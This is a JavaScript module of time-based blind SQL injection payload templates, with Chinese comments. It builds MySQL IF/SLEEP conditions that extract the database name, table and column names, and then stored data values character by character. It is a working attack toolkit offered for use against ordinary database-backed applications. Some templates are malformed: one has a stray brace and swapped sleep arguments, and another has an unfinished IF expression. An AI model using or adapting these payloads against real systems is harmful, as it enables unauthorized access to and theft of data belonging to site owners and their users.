
const sleepTime = 2
const timeTamp = {
  // 数据库名称长度
  databaseLength: (char) =>
    (`if(length(database())=${char},sleep(${sleepTime}),1)`),
  // 数据库名称
  databaseName: (char, len) =>
    (`if(ascii(substr(database(),${len},1)) = ${char},sleep(${sleepTime}),1)`),
  // 数据库表的个数
  schemaTablesLength: (dbName, char) =>
    (`if((select count(1) from information_schema.tables where table_schema = '${dbName}') > ${char},sleep(${sleepTime}),1)`),
  // 数据库每个表的长度，-是一个list
  tablesLength: (dbName, char) =>
    (`if((select length(table_name) from information_schema.tables where table_schema = '${dbName}' limit ${char}, 1) > {${sleepTime}},sleep(1),1)`),
  // 表的名称 -是一个list
  tablesName: (dbName, char, index) =>
    (`if(ascii(substr((select table_name from information_schema.tables where table_schema = '${dbName}' limit ${char}, 1),${index}, 1))`),
  // 字段个数
  schemaColumnsLength: (tbName, char) =>
    (`if((select count(1) from information_schema.columns where table_name = '${tbName}') > ${char},sleep(1),1)`),
  // 字段长度
  columnsLengthList: (tbName, char, len) =>
    (`if((select length(column_name) from information_schema.columns where table_name = '${tbName}' limit ${char}, 1) > ${len},sleep(1),1)`),
  // 字段名称
  columnsName: (tbName, char, index, code) =>
    (`if(ascii(substr((select column_name from information_schema.columns where table_name = '${tbName}' limit ${char}, 1),${index}, 1)) > ${code},sleep(1),1)`),
  // 数据长度
  resultLength: (tbName, cName, char) =>
    (`if((select length(${cName}) from ${tbName} limit 0, 1) > ${char},sleep(${sleepTime}),1)`),
  // 数据的值
  result: (tbName, cName, char, code) =>
    (`if(ascii(substr((select ${cName} from ${tbName} limit 0, 1),${char}, 1)) > ${code}, sleep(${sleepTime}),1)`)
}

module.exports = {
  // 时间盲注
  sleepTime,
  timeTamp,
}
